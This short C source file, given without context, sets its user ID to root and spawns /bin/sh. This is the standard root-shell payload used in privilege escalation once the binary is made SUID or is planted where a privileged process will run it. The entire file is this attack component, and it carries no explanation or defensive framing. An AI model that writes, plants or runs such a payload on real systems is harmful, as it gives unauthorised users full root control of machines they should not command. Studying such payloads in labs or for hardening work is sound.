#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
    setuid(0);
    system("/bin/sh");
    return 0;
}
